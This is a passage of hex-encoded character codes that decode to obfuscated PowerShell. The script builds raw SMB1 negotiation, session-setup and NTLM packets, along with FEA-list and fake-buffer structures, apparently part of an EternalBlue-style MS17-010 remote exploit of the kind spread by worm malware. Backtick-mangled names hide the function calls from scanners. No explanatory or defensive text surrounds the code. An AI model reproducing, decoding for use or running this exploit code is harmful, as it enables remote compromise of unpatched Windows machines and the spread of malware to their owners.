66 , 20 , '3d',20 ,43,72, 60 , 65,41 , 60,54 , 45 ,46,61,'6b', 65, 53 , 52 , 56 ,'4e' ,65 , 54 ,62, 75 , 46,66,45, 60, 52 , 38 ,28 , 24,73 , 63 ,'5f',73, 69 ,'7a' ,65,29, 'd','a' ,20 , 20 , 20 ,20 ,24,61 ,'3d', '5b',62 ,69, 74, 63 ,'6f' , '6e' ,76 , 65 , 72 ,74 , 65, 72,'5d', '3a' , '3a' , 47, 65, 74, 42 , 79,74 ,65 , 73 , 28,24 ,66, 61, '6b',65,53 , 72 ,76 , '4e' ,65,74, 42, 75, 66,'2e', '4c',65 ,'6e' ,67, 74 ,68,'2d', 31, 29 ,'d','a' ,9 ,24, 66 , 65,61 , '4c', 69 , 73, 74, 20,'2b','3d' , 20 , 30,78,30,30, '2c' ,30 ,78,30,30 ,'2c' , 24 , 61 , '5b', 30, '5d' ,'2c' ,24 , 61, '5b' , 31,'5d' , 20 ,'2b' ,20 ,24 ,66,61 ,'6b' ,65 , 53, 72,76, '4e',65 , 74 ,42, 75, 66 ,'d', 'a',9,24 ,66 ,65, 61, '4c', 69 , 73 , 74, 20 , '2b' , '3d' , 20, 30 , 78 ,31, 32, '2c' ,30,78 , 33 , 34, '2c' ,30,78 , 37, 38 , '2c',30 , 78,35, 36, 'd', 'a' , 9, 72,65 , 74 ,75 , 72,'6e' , 20 , 24, 66 ,65,61 ,'4c', 69 , 73, 74,'d' ,'a','7d' , 'd', 'a' ,'d', 'a',66,75,'6e',63, 74 ,69 ,'6f' , '6e',20,20 , '6d' ,61 ,'6b',65,'5f',73,'6d' ,62,31, '5f' , '6c', '6f',67,69 , '6e' , 38, '5f', 70 , 61 , 63, '6b',65 ,74, 38, 20 ,'7b', 'd' ,'a' , 20 , 20 , 20 ,20, '5b' ,42,79 , 74,65 , '5b' , '5d','5d', 20,24 , 70, '6b', 74 ,20 , '3d', 20 ,'5b',42,79, 74 ,65, '5b', '5d' , '5d',20, 28, 30 , 78 , 30 , 30 , 29,'d' ,'a',20 ,20,20,20 ,24,70 , '6b', 74 , 20, '2b','3d',20, 30, 78,30, 30,'2c',30 , 78, 30,30,'2c', 30 ,78 , 38 ,38,'d' ,'a' , 20,20, 20 ,20,24, 70 ,'6b' ,74,20 , '2b' , '3d',20, 30 , 78,66,66 , '2c' ,30 ,78 ,35 ,33,'2c',30 , 78 , 34 , 44 ,'2c' ,30, 78 , 34,32 ,'d' , 'a' , 20 , 20, 20,20 , 24,70,'6b', 74 , 20,'2b' , '3d',20 ,30 , 78, 37 ,33 , 'd','a' ,20, 20 , 20 , 20, 24 , 70,'6b' ,74 ,20 , '2b','3d' ,20 , 30 ,78 , 30 ,30 , '2c', 30 ,78,30,30, '2c',30, 78,30 , 30 ,'2c', 30 , 78 , 30 ,30,'d' ,'a', 20 , 20 , 20 ,20 ,24 ,70 , '6b' , 74 , 20 ,'2b' ,'3d',20 , 30, 78, 31, 38,'d', 'a' ,20 ,20, 20 , 20 ,24, 70, '6b',74 , 20 ,'2b' ,'3d', 20 ,30,78 ,30 , 31,'2c', 30 , 78, 34,38 , 'd' ,'a',20 , 20, 20 , 20 , 24,70, '6b' , 74, 20 ,'2b' , '3d', 20 , 30, 78,30, 30, '2c' ,30 ,78 , 30 , 30 , 'd', 'a' , 20, 20,20 , 20,24, 70 , '6b', 74 , 20, '2b' ,'3d', 20 , 30 , 78,30 ,30,'2c' , 30,78 ,30,30 , '2c' , 30 , 78, 30 , 30, '2c' ,30 , 78 , 30,30, 'd' ,'a', 20 , 20,20 ,20,24 ,70 , '6b' , 74,20 ,'2b' ,'3d' ,20 ,30, 78, 30 , 30 ,'2c' ,30, 78 ,30 ,30 , '2c', 30, 78, 30 ,30, '2c', 30 , 78,30 ,30 , 'd','a',20, 20, 20 ,20 , 24 ,70 , '6b' , 74, 20,'2b' , '3d', 20, 30 , 78, 30 , 30 , '2c' , 30, 78, 30, 30,'d' , 'a' ,20 ,20 ,20,20 , 24 ,70,'6b' ,74 , 20, '2b' ,'3d' ,20 ,30,78,66 , 66 , '2c' ,30, 78 ,66 ,66,'d' , 'a' , 20 , 20 ,20, 20,24 ,70,'6b' ,74,20 , '2b','3d' , 20, 30,78, 32 , 66, '2c' ,30, 78 , 34, 62,'d','a' , 20,20 , 20,20 , 24,70, '6b' , 74, 20 , '2b','3d',20 , 30 ,78 , 30 ,30, '2c' , 30,78,30 , 30, 'd', 'a', 20 ,20 ,20,20 , 24 , 70,'6b', 74 , 20, '2b' , '3d' , 20 ,30 , 78 , 30 , 30,'2c' ,30 ,78 ,30 ,30 , 'd', 'a' ,20,20 , 20 , 20, 24 , 70 , '6b',74 ,20,'2b' , '3d',20,30,78 ,30, 63,'d', 'a' , 20 ,20, 20,20,24, 70 , '6b',74 , 20,'2b' , '3d' , 20,30, 78 ,66 , 66,'d' ,'a', 20,20 , 20,20, 24 , 70, '6b' , 74 ,20,'2b','3d',20, 30 ,78 ,30, 30 , 'd', 'a' ,20 , 20,20 ,20,24, 70,'6b' , 74,20,'2b' , '3d',20 , 30, 78, 30,30,'2c', 30,78,30 ,30,'d' ,'a', 20,20,20, 20,24 ,70, '6b' , 74,20, '2b' , '3d',20 , 30,78,30,30 , '2c' , 30, 78 , 66 , 30,'d','a', 20 ,20,20,20 ,24 ,70,'6b',74, 20 ,'2b','3d', 20 ,30, 78 ,30, 32 ,'2c',30 ,78 ,30, 30 , 'd' , 'a', 20 , 20 ,20 , 20 ,24, 70 ,'6b' , 74,20 ,'2b', '3d' , 20, 30 ,78,30 , 31 , '2c' ,30, 78,30, 30 ,'d', 'a' ,20 , 20, 20, 20 , 24,70 , '6b', 74,20, '2b' ,'3d' ,20 , 30, 78 , 30 ,30,'2c' ,30, 78 , 30,30 , '2c' , 30, 78, 30,30 , '2c' ,30,78 ,30, 30 ,'d', 'a' , 9 ,24 ,70,'6b',74, 20 ,'2b', '3d' , 20,30, 78,34,32,'2c' ,30, 78,30, 30 ,'2c' , 30 , 78 ,30,30 , '2c' ,30, 78, 30, 30, '2c' , 30, 78 ,30,30,'2c' ,30 ,78 , 30,30, 'd' , 'a' ,9 , 24 , 70, '6b' , 74 ,20 ,'2b' ,'3d',20 ,30, 78 ,34,34, '2c',30,78, 63 , 30, '2c', 30 ,78, 30,30 , '2c', 30, 78 , 38, 30 , 'd' ,'a',9 , 24 ,70 , '6b', 74,20,'2b' , '3d' ,20, 30 , 78 ,34 , 64 ,'2c' , 30 ,78 ,30,30, 'd','a' ,9 ,24 , 70 ,'6b',74 , 20,'2b' , '3d' ,20, 30 ,78,36, 30 , '2c', 30 , 78 , 34,30 , '2c',30,78 ,30,36,'2c' , 30 , 78 ,30, 36, '2c', 30, 78, 32, 62 , '2c' , 30, 78,30, 36 , '2c' ,30 ,78 ,30, 31, '2c' ,30 ,78 ,30,35, '2c' ,30,78 ,30,35, '2c',30 ,78 , 30 , 32 , '2c' ,30,78 ,61,30, '2c' , 30,78, 33,36, '2c', 30,78, 33 ,30,'2c' ,30, 78, 33,34, '2c' ,30, 78 ,61 , 30,'2c',30 , 78, 30 ,65,'2c' , 30 , 78, 33 ,30, '2c',30 ,78 ,30 ,63, '2c' , 30,78 ,30 , 36, '2c',30,78,30,61 ,'2c' ,30, 78,32 , 62 ,'2c',30 , 78 ,30 ,36 ,'2c',30,78,30, 31 ,'2c' ,30,78, 30,34 ,'2c' , 30,78, 30, 31,'2c' ,30,78 , 38,32 , '2c', 30 ,78 ,33 , 37 ,'2c', 30, 78 ,30,32,'2c', 30 ,78 ,30,32 , '2c' ,30,78, 30 , 61,'2c', 30 , 78 , 61 ,32 ,'2c' ,30 , 78 ,32 ,32 ,'2c' ,30 , 78, 30 , 34,'2c' , 30 , 78,32 ,30,'2c',30 ,78 , 34, 65, '2c' , 30 , 78,35, 34,'2c' ,30, 78 ,34 , 63 , '2c' ,30 ,78 , 34 , 64 ,'2c' ,30, 78 , 35,33, '2c',30, 78, 35,33, '2c', 30 , 78, 35 , 30,'2c' , 30 ,78 ,30, 30, '2c', 30 ,78 , 30, 31 ,'2c' ,30 , 78,30,30,'2c' ,30, 78, 30,30, '2c',30,78 ,30 , 30 ,'2c', 30, 78 ,30, 35 , '2c' , 30,78, 30 ,32 , '2c' , 30,78, 38 ,38 , '2c' ,30 ,78,61,30,'2c',30 , 78 , 30 ,30, '2c' ,30 ,78, 30,30,'2c' ,30,78 , 30 ,30, '2c', 30,78,30, 30,'2c' ,30 , 78,30 , 30 , '2c' ,30 , 78 ,30 , 30, '2c', 30, 78 , 30, 30 ,'2c',30,78, 30 ,30,'2c', 30 , 78, 30 ,30,'2c',30, 78, 30 ,30 , '2c',30,78 ,30 , 30, '2c',30, 78 , 30 , 30 , '2c' ,30 ,78,30 ,30, '2c' ,30,78 ,30 ,30 , '2c',30 , 78,30, 30, '2c' ,30 ,78,30 ,30 , 'd','a',20, 20 , 20, 20,24, 70, '6b', 74, 20,'2b', '3d' , 20 ,30,78, 35,35 , '2c' , 30, 78 ,36 , 65,'2c',30, 78, 36 , 39 ,'2c' ,30 ,78 , 37 , 38 , '2c' ,30, 78,30, 30 ,'d' ,'a', 20 ,20,20 , 20, 24 ,70, '6b',74,20 , '2b' ,'3d', 20 ,30,78 ,35 ,33 ,'2c', 30,78,36 , 31 , '2c' ,30, 78 , 36 , 64, '2c' ,30 , 78,36,32, '2c', 30 , 78, 36,31,'2c',30 ,78 , 30,30, 'd' ,'a' , 20 , 20 , 20, 20,72 ,65,74,75,72 , '6e' ,20 , 24 ,70 ,'6b' ,74, 'd' , 'a','7d' , 'd' ,'a',66 ,75 , '6e', 63 ,74,69 ,'6f' , '6e',20 ,20 ,'6d' , 61 , '6b',65,'5f' , '6e' ,74, '6c' , '6d' ,'5f' , 61 ,75 , 74, 68, '5f',70 ,61 ,63 , '6b' ,65, 74, 38 , 28,24 ,75,73,65 , 72, '5f' , 69, 64 ,29,20,'7b' , 'd' , 'a' ,20, 20 ,20,20 , '5b',42,79,74 , 65, '5b' , '5d','5d', 20,24 , 70 , '6b', 74, 20 , '3d',20 ,'5b', 42 , 79 , 74 , 65,'5b' ,'5d' ,'5d', 20 , 28 ,30 ,78, 30,30,29, 'd' , 'a',20,20 ,20 , 20 ,24, 70, '6b',74,20, '2b','3d' ,20 , 30 ,78 , 30 , 30, '2c', 30, 78 ,30, 30 ,'2c' , 30 , 78 , 39, 36,'d' ,'a' ,20, 20, 20, 20,24 , 70 , '6b', 74 , 20 ,'2b', '3d', 20 ,30, 78, 66,66,'2c', 30,78 ,35,33,'2c',30, 78 ,34 ,44 ,'2c',30 , 78,34, 32 ,'d','a', 20,20 ,20 , 20,24 , 70, '6b' , 74,20,'2b' , '3d', 20, 30 , 78,37 ,33 , 'd', 'a',20,20,20 , 20,24 , 70,'6b' , 74, 20 , '2b', '3d' , 20 ,30 ,78 , 30, 30, '2c', 30,78 ,30 ,30 ,'2c' , 30, 78 ,30 ,30 , '2c' , 30 , 78,30, 30 , 'd', 'a',20,20 ,20,20 , 24 , 70, '6b' , 74, 20, '2b', '3d' ,20 , 30, 78, 31, 38 , 'd', 'a',20, 20,20, 20 ,24 ,70 , '6b', 74 , 20 ,'2b' ,'3d' , 20 ,30, 78 , 30,31,'2c' , 30, 78, 34,38 , 'd' , 'a' ,20,20 , 20 ,20, 24 , 70 ,'6b', 74, 20,'2b','3d',20 ,30, 78 ,30, 30, '2c' ,30 ,78 , 30 ,30, 'd' ,'a',20 , 20,20 , 20,24 , 70 ,'6b' ,74,20,'2b','3d' , 20 , 30,78, 30, 30, '2c', 30 ,78, 30, 30 ,'2c' ,30,78 , 30,30 , '2c' ,30, 78 , 30 ,30,'d' ,'a',20, 20 , 20,20,24, 70,'6b' , 74, 20 , '2b' , '3d' , 20, 30 ,78 , 30 , 30 , '2c' , 30 ,78,30 , 30,'2c' ,30 , 78, 30 , 30 ,'2c' ,30 ,78 , 30 ,30, 'd', 'a',20 , 20,20, 20,24 , 70,'6b', 74 , 20 , '2b' ,'3d',20, 30, 78, 30 , 30, '2c',30,78,30 , 30 ,'d', 'a' , 20 , 20, 20,20, 24 , 70 , '6b', 74,20 ,'2b', '3d', 20 , 30,78, 66, 66 , '2c' , 30 ,78 , 66, 66,'d' ,'a',20 , 20, 20,20,24,70 ,'6b' ,74 , 20 , '2b','3d',20, 30,78 ,32, 66, '2c',30 , 78, 34, 62,'d', 'a',20,20 ,20 ,20 , 24 , 70, '6b', 74,20 ,'2b','3d', 20 ,24, 75 ,73 , 65 ,72 , '5f' ,69 , 64,'d' , 'a' , 20 , 20,20 ,20 , 24,70 ,'6b', 74 , 20,'2b', '3d', 20 ,30 , 78, 30, 30 , '2c',30 ,78, 30, 30 ,'d' ,'a' ,20 , 20 ,20, 20,24 ,70, '6b',74,20, '2b', '3d' ,20 , 30 ,78, 30 , 63, 'd','a' ,20 ,20 , 20 , 20,24 , 70,'6b', 74 , 20 , '2b' ,'3d',20 , 30, 78 ,66 ,66 , 'd' , 'a' , 20 , 20, 20 , 20, 24, 70 ,'6b', 74,20,'2b' ,'3d',20 ,30 , 78 , 30 ,30 ,'d', 'a' ,20,20 ,20, 20,24 , 70 ,'6b' ,74 ,20, '2b' ,'3d' ,20 , 30 , 78,30 ,30 , '2c' , 30 , 78 ,30 ,30 , 'd', 'a' , 20 , 20, 20,20,24 ,70, '6b', 74 , 20,'2b' ,'3d',20,30, 78, 30, 30,'2c',30 ,78 ,66,30 ,'d', 'a' ,20 , 20, 20, 20,24 ,70, '6b' , 74 ,20 ,'2b' , '3d',20 , 30 ,78 , 30, 32 ,'2c', 30, 78,30 ,30,'d' ,'a' ,20 , 20 ,20,20, 24 ,70 , '6b',74, 20, '2b' ,'3d' , 20 ,30, 78,30, 31,'2c' ,30 ,78, 30, 30 , 'd','a',20,20,20 , 20 , 24,70 , '6b',74,20, '2b','3d',20, 30,78 , 30, 30 , '2c' ,30,78 , 30 ,30 ,'2c' , 30,78 ,30, 30 , '2c' , 30 ,78 , 30,30, 'd' ,'a',9, 24 ,70 ,'6b', 74 ,20,'2b', '3d' , 20, 30,78,35, 30 ,'2c', 30 , 78 ,30 , 30, '2c',30, 78,30,30,'2c',30 , 78, 30 , 30, '2c' ,30 ,78 , 30, 30 , '2c', 30,78 ,30 , 30,'d' ,'a' ,9, 24 ,70, '6b' , 74 ,20,'2b' , '3d',20, 30 ,78,34, 34,'2c' ,30 ,78,63,30,'2c', 30 , 78 ,30, 30,'2c',30,78 ,38 , 30,'d', 'a' , 9 , 24 ,70,'6b',74, 20 , '2b' ,'3d' , 20 , 30 ,78 , 35 , 62,'2c' , 30 ,78 , 30,30,'d' ,'a' ,9, 24 , 70,'6b' , 74 ,20 ,'2b' ,'3d' ,20 , 30 , 78,61,31,'2c' ,30,78 ,34,65, '2c', 30 , 78 ,33,30,'2c', 30 , 78 ,34, 63 , '2c' , 30, 78,61 ,32 ,'2c',30 ,78 , 34,61, '2c' , 30,78 ,30 , 34 , '2c' ,30, 78,34, 38, '2c',30, 78, 34 , 65, '2c', 30, 78,35 , 34 , '2c' , 30, 78 , 34 , 63 ,'2c' , 30, 78 , 34, 64,'2c' ,30 , 78,35,33, '2c', 30 , 78 , 35 ,33, '2c', 30, 78 ,35,30 ,'2c', 30, 78 ,30,30, '2c', 30 ,78 ,30 , 33, '2c', 30, 78 ,30,30,'2c',30 ,78,30 , 30,'2c' ,30 ,78, 30,30, '2c' , 30, 78, 30 , 30 , '2c',30, 78, 30,30 ,'2c' ,30,78, 30,30 ,'2c',30 , 78 , 30,30,'2c' ,30, 78, 34, 38,'2c', 30 , 78 , 30, 30, '2c', 30, 78, 30, 30 ,'2c' ,30 , 78, 30 ,30, '2c' , 30,78,30 ,30 , '2c',30 ,78, 30, 30, '2c' ,30 ,78 ,30 , 30,'2c' , 30 ,78 ,30 , 30 , '2c' ,30, 78 ,34 , 38 ,'2c' , 30,78 , 30, 30 ,'2c',30,78, 30,30 ,'2c' ,30, 78, 30,30, '2c',30, 78,30,30 , '2c',30, 78 ,30, 30 ,'2c' ,30,78 ,30,30, '2c', 30 ,78 ,30, 30, '2c',30,78,34,30,'2c' ,30, 78 , 30,30 , '2c',30 , 78 ,30,30 ,'2c' , 30,78, 30,30 , '2c',30,78 ,30 , 30, '2c', 30, 78 , 30 , 30,'2c' , 30 ,78,30, 30,'2c' , 30 ,78 ,30, 30 , '2c',30 ,78, 34, 30 , '2c',30,78,30, 30 ,'2c' , 30, 78, 30,30,'2c',30,78, 30, 30 , '2c' , 30 ,78, 30 ,38,'2c', 30 , 78, 30, 30 ,'2c' , 30 ,78 ,30,38, '2c' , 30,78 , 30 ,30, '2c' , 30, 78 , 34 ,30 , '2c' ,30,78 , 30, 30 , '2c',30 ,78, 30,30, '2c', 30 ,78 , 30 , 30, '2c',30 , 78, 30, 30, '2c', 30,78 ,30,30, '2c' , 30, 78 ,30 , 30, '2c', 30, 78 , 30, 30 ,'2c',30, 78,34 ,38 ,'2c',30,78, 30, 30 , '2c',30 , 78 , 30 ,30,'2c', 30 , 78 ,30, 30 ,'2c', 30 , 78, 30 ,35, '2c', 30, 78,30 , 32,'2c', 30, 78,38,38 ,'2c' ,30 ,78,61,30, '2c' , 30 , 78, 34 , 65 ,'2c' , 30 , 78 , 30, 30 , '2c', 30,78,35, 35 , '2c', 30,78, 30 , 30, '2c', 30,78,34,63 ,'2c' ,30,78,30 , 30 ,'2c' ,30 ,78, 34 , 63, '2c' ,30,78, 30 , 30,'d' ,'a' ,'d' , 'a',20,20,20 ,20, 24,70, '6b' ,74 ,20 , '2b', '3d' ,20 , 30 ,78 , 35 ,35,'2c' , 30,78,36 , 65 , '2c' ,30, 78 ,36 ,39 ,'2c' , 30, 78 ,37 , 38, '2c' ,30 , 78, 30,30,'d' ,'a' ,20 , 20,20 ,20, 24, 70 , '6b' , 74, 20, '2b' ,'3d', 20 , 30 , 78,35 , 33,'2c',30 , 78, 36, 31,'2c' , 30,78 , 36 ,64 , '2c' , 30, 78,36,32, '2c',30 ,78, 36, 31 ,'2c' ,30,78 ,30 ,30, 'd','a', 20, 20 ,20 ,20, 72 ,65,74 ,75 , 72, '6e',20,24, 70,'6b' ,74, 'd' , 'a' ,'7d' ,'d','a' ,66,75, '6e', 63 ,74, 69 ,'6f' ,'6e', 20,73 , '6d' , 62 , 31,'5f','6c' ,'6f',67 ,69 , '6e',38, 28, 24 ,73 ,'6f' ,63,'6b', 29 , '7b','d', 'a' , 20,20 ,20,20,24, 72, 61 ,77, '5f', 70,72 ,'6f', 74 , '6f',20 ,'3d' ,20 ,'4d',60 ,41 , '4b' ,45,60 , '5f' , 73 , 60,'6d', 42 ,31 ,'5f' , 60,'6c', 60,'4f' ,60 , 47 , 69 ,'4e' ,38, '5f', 70,41 , 63, 60 , '4b',65 ,54, 38 ,'d' , 'a' , 20 , 20,20,20, 24, 73, '6f', 63 , '6b','2e' ,53 , 65 ,'6e' , 64 , 28, 24,72 ,61,77 , '5f' ,70 ,72 ,'6f',74 ,'6f' , 29 , 20, '7c' , 20 ,'4f' , 55,60, 54, 60,'2d', '4e' , 55 ,'6c', '4c' ,'d' , 'a' , 20,20 ,20, 20 ,24 , 72,61, 77 , '2c', 20 , 24 ,73,'6d' , 62 , 68,65,61,64,65,72 ,'3d' , 53 ,'4d' ,60 , 42 , 31 ,'5f', 60 , 47, 65 , 74 , '5f' , 52 ,45 ,73 , 70,'4f' , '4e' ,53 , 60,45 , 38,28 ,24,73,'6f' ,63 , '6b' , 29,'d','a',20 , 20, 20,20,24,72 , 61,77, '5f',70 ,72,'6f', 74, '6f' ,20 ,'3d' , 20 , '6d', 41,'6b', 60 ,65, '5f','6e' ,54, 60, '4c' , '6d' , 60, '5f' , 41 ,75,54 , 68,'5f' ,60 ,70, 61 ,43, '4b',45,54, 38 , 28, 24 , 73, '6d' , 62, 68, 65 ,61,64,65 ,72,'2e' , 75,73 , 65, 72,'5f', 69, 64 ,29 , 'd' ,'a' ,20 ,20, 20, 20 , 24 , 73, '6f' ,63 ,'6b','2e', 53 ,65 ,'6e' ,64 , 28 ,24, 72,61 , 77 ,'5f' ,70 ,72 ,'6f' , 74 , '6f' ,29 , 20 ,'7c' , 20,'4f' ,60,55 ,54 , 60, '2d' , '4e' , 55 , '4c','4c' ,'d','a' ,20 ,20, 20,20,72 , 65 , 74 ,75,72, '6e' , 20 ,53,'4d',62, 31, '5f',47 , 60,65,60, 54, '5f' ,72, 65,60,73, 70, '6f' , '4e', 53, 65 , 38, 28 ,24,73,'6f' , 63, '6b' ,29, 'd' ,'a' , 'd','a' , 'd','a', '7d','d' , 'a',66 ,75,'6e',63 , 74,69, '6f', '6e', 20 ,'6e',65 , 67 ,'6f' , 74, 69, 61, 74 ,65, '5f' , 70,72 ,'6f' , 74 ,'6f' ,'5f' ,72 ,65, 71 , 75 , 65 , 73, 74,38 , 28 , 24 ,75,73 , 65, '5f','6e', 74,'6c' , '6d', 29,'d','a','7b' , 'd' , 'a' ,20 ,20,20 , 20, 20 , 20 , '5b',42 ,79 ,74 , 65, '5b' ,'5d' , '5d', 20 , 20 ,24,70 , '6b' , 74,20 , '3d' ,20,'5b' ,42 , 79,74, 65 ,'5b','5d' , '5d' ,20 , 28,30 ,78, 30,30, 29,'d' ,'a', 20 , 20 ,20,20 ,20 ,20, 24 ,70 , '6b' ,74 ,20 ,'2b','3d', 20 ,30, 78 , 30, 30, '2c',30 , 78,30 ,30,'2c', 30 , 78 ,32, 66,'d', 'a',20 ,20 ,20 , 20,20 , 20 ,24, 70 , '6b' ,74 , 20,'2b', '3d',20,30 , 78 , 46 ,46 , '2c',30, 78 ,35,33,'2c', 30, 78,34 ,44 ,'2c' , 30,78,34,32 , 'd' ,'a' , 20, 20 ,20,20 ,20 ,20,24,70,'6b' , 74 ,20 , '2b' , '3d', 20, 30,78 , 37 , 32, 'd' , 'a' , 20,20 , 20 ,20, 20 ,20 , 24, 70 , '6b', 74, 20,'2b', '3d' ,20 , 30 , 78,30, 30, '2c',30 , 78 , 30 , 30 ,'2c' ,30, 78, 30,30, '2c' , 30 ,78, 30,30 ,'d', 'a' ,20,20 , 20 ,20 , 20 ,20 ,24, 70, '6b', 74, 20, '2b' , '3d', 20 , 30 ,78, 31 ,38 , 'd' , 'a' , 20, 20,20 ,20 , 20 , 20,69, 66,28, 24 ,75, 73 ,65, '5f' ,'6e', 74 , '6c' ,'6d', 29,'7b', 20 , 24 ,70 , '6b' ,74 , 20,'2b' ,'3d', 20, 20, 30, 78,30 ,31,'2c',30,78 ,34 , 38 , 20, '7d' ,'d' ,'a' , 20 , 20 ,20 ,20 , 20 ,20 ,65 , '6c',73, 65 ,'7b',20, 24,70, '6b', 74,20,'2b' ,'3d', 20,20 , 30 ,78 ,30 ,31, '2c' , 30, 78,34, 30, 20 ,'7d','d','a',20, 20, 20 , 20,20,20 , 24 ,70,'6b' ,74,20,'2b' ,'3d',20, 30, 78,30 ,30 , '2c',30, 78, 30 ,30 , 'd' , 'a',20,20,20, 20,20, 20,24,70 ,'6b' , 74,20 , '2b','3d', 20, 30 ,78,30 ,30,'2c' ,30 , 78 , 30,30,'2c', 30,78, 30 , 30,'2c' , 30 , 78 , 30 , 30 ,'2c' ,30 ,78, 30 ,30,'2c' , 30,78, 30, 30,'2c' ,30 , 78, 30 , 30 ,'2c' , 30 ,78,30,30, 'd', 'a' ,20 , 20,20, 20,20 , 20, 24 ,70, '6b',74 ,20 ,'2b' , '3d' ,20 ,30 ,78, 30 ,30 , '2c' , 30 , 78,30, 30 , 'd', 'a', 20 ,20,20, 20, 20 ,20, 24 , 70,'6b' ,74,20 , '2b', '3d',20 ,30,78 , 66 , 66, '2c' , 30 ,78 , 66, 66 ,'d' ,'a',20 ,20 ,20 , 20 , 20 , 20 ,24 ,70 ,'6b' , 74 , 20 ,'2b' , '3d' , 20,30,78,32,46 ,'2c',30, 78 ,34,42 , 'd' ,'a' ,20, 20,20 ,20, 20 ,20,24,70,'6b', 74 ,20 , '2b' ,'3d', 20 ,30, 78 ,30,30, '2c', 30, 78 , 30,30 ,'d' ,'a' , 20 ,20,20, 20 ,20, 20, 24 , 70 , '6b', 74 ,20 , '2b', '3d' , 20,30,78 , 30, 30 , '2c',30,78 , 30, 30 , 'd', 'a' , 20, 20,20 , 20 ,20,20 ,24 ,70 , '6b',74 , 20 ,'2b','3d', 20, 30, 78 ,30 , 30 ,'d' ,'a' , 20 ,20 ,20 , 20 ,20,20,24, 70, '6b', 74,20 , '2b' , '3d', 20 , 30 , 78 ,30 , 63, '2c' ,30 , 78 , 30,30,'d' ,'a' ,20 ,20 ,20 ,20,20 , 20, 24 , 70, '6b' ,74 ,20, '2b','3d', 20 , 30 ,78,30 ,32,'d' , 'a', 20 , 20 , 20, 20 , 20, 20 , 24,70 ,'6b' , 74, 20 , '2b' ,'3d' ,20, 30 ,78, 34, 45 , '2c' ,30 ,78 , 35,34 , '2c',30,78 , 32,30 ,'2c', 30, 78, 34, 43 ,'2c' ,30 , 78,34, 44 ,'2c', 30,78 , 32 , 30,'2c', 30, 78, 33 ,30,'2c' , 30,78, 32 ,45 ,'2c', 30, 78,33,31 , '2c' , 30 , 78, 33, 32 ,'2c' ,30, 78 , 30 ,30 , 'd' ,'a', 20,20 ,20 ,20 ,20 , 20 , 72 , 65, 74 , 75, 72,'6e' ,20 ,24 , 70 , '6b' ,74 ,'d','a' , '7d','d','a',66, 75, '6e', 63,74 , 69,'6f', '6e',20 ,73 , '6d' ,62, '5f' ,68 , 65, 61, 64,65,72 , 38 , 28 , 24, 73 , '6d', 62 , 68,65, 61 ,64 , 65, 72,29,20,'7b', 'd','a', 24,70,61 ,72, 73 , 65 ,64,'5f', 68,65, 61, 64 ,65,72, 20 ,'3d',40 ,'7b',73, 65, 72 ,76 ,65 , 72, '5f' , 63 , '6f' , '6d', 70, '6f','6e' , 65, '6e' ,74, '3d' , 24 ,73, '6d',62, 68 ,65, 61,64,65 ,72 ,'5b' ,30, '2e','2e', 33, '5d', '3b' ,'d' ,'a',20 , 20 ,20, 20 ,20, 20 , 20 , 20, 20,20 , 20, 20, 20,20,20 ,20 ,20, 20,73, '6d', 62,'5f' ,63 ,'6f','6d' ,'6d', 61,'6e' , 64, '3d' , 24 ,73,'6d',62 , 68 , 65 , 61 ,64, 65, 72 , '5b', 34, '5d','3b','d','a',20,20 , 20 ,20,20 , 20, 20 , 20, 20, 20, 20 , 20 , 20 , 20 , 20, 20, 20 , 20 ,65, 72 , 72,'6f',72 ,'5f', 63 ,'6c',61 ,73 , 73,'3d', 24 ,73, '6d', 62, 68, 65 , 61,64,65 , 72,'5b' ,35 ,'5d', '3b' , 'd' , 'a',20 , 20,20, 20, 20,20 , 20,20 ,20, 20,20,20 ,20, 20 , 20 ,20 , 20 , 20,72 ,65,73, 65 , 72,76, 65 , 64 ,31 ,'3d',24 , 73,'6d' , 62, 68, 65 , 61,64 ,65,72 ,'5b' , 36, '5d','3b' ,'d' , 'a',20,20,20,20, 20, 20 , 20,20 ,20, 20,20,20 ,20 , 20, 20 , 20, 20 ,20 , 65 , 72, 72, '6f',72 ,'5f', 63 , '6f' ,64 , 65,'3d',24,73,'6d', 62 , 68 ,65,61 , 64 , 65 , 72,'5b' , 37 ,'2e','2e',38, '5d', '3b','d' , 'a' ,20,20 ,20 , 20 ,20, 20,20,20,20, 20 , 20, 20 , 20,20 ,20, 20 , 20, 20, 66 , '6c' ,61 , 67 , 73 ,'3d',24 ,73 , '6d' , 62 , 68 ,65, 61, 64, 65 ,72 , '5b' ,39 ,'5d' , '3b','d', 'a' ,20,20 , 20 , 20 , 20, 20 , 20,20, 20, 20,20, 20 , 20, 20 , 20,20 ,20 , 20, 66,'6c' ,61, 67 , 73,32 , '3d' ,24,73,'6d',62 ,68 , 65,61 , 64,65 ,72, '5b', 31,30, '2e','2e' ,31 , 31,'5d','3b' , 'd', 'a' , 20 , 20,20, 20 ,20 ,20, 20, 20 ,20, 20 , 20, 20 ,20 , 20,20, 20 , 20 ,20, 70,72 ,'6f' , 63 ,65,73 ,73 ,'5f', 69 , 64,'5f',68, 69 ,67, 68 , '3d',24 ,73 ,'6d' , 62 , 68,65 ,61, 64 ,65,72,'5b' , 31 , 32 , '2e' , '2e' ,31, 33,'5d', '3b','d', 'a', 20,20,20, 20,20,20,20, 20 ,20 ,20 , 20 ,20, 20,20,20,20 , 20 , 20,73 , 69,67,'6e', 61 ,74 ,75,72 , 65,'3d' , 24, 73 ,'6d',62, 68,65,61,64 , 65 , 72 ,'5b',31 ,34 ,'2e','2e', 32, 31 ,'5d' , '3b' , 'd' ,'a', 20 , 20, 20 , 20,20 , 20, 20, 20 , 20 , 20,20 ,20 , 20 , 20,20, 20 ,20, 20 , 72,65 ,73, 65 ,72,76 , 65,64,32 ,'3d',24 ,73, '6d', 62, 68 ,65, 61, 64, 65 , 72,'5b',32,32 , '2e','2e',32 , 33, '5d','3b' ,'d','a' ,20, 20 , 20 , 20,20 , 20 ,20, 20 ,20,20 ,20 ,20 , 20 ,20 , 20, 20 ,20,20,74 , 72, 65, 65, '5f' ,69,64,'3d' ,24 , 73 , '6d',62,68, 65 , 61, 64 ,65,72,'5b',32 , 34 ,'2e' , '2e', 32 ,35 , '5d' , '3b','d', 'a', 20,20 ,20, 20 ,20 , 20,20, 20 , 20,20 , 20 ,20 , 20 , 20,20 ,20,20, 20,70,72 , '6f' , 63 , 65,73, 73, '5f' ,69 ,64 ,'3d', 24,73, '6d', 62 ,68, 65 ,61 , 64 ,65 ,72, '5b',32 ,36 , '2e','2e' ,32 , 37, '5d' , '3b', 'd' , 'a' ,20, 20 ,20,20 ,20 ,20,20 ,20 ,20, 20 , 20 , 20, 20, 20, 20 , 20, 20, 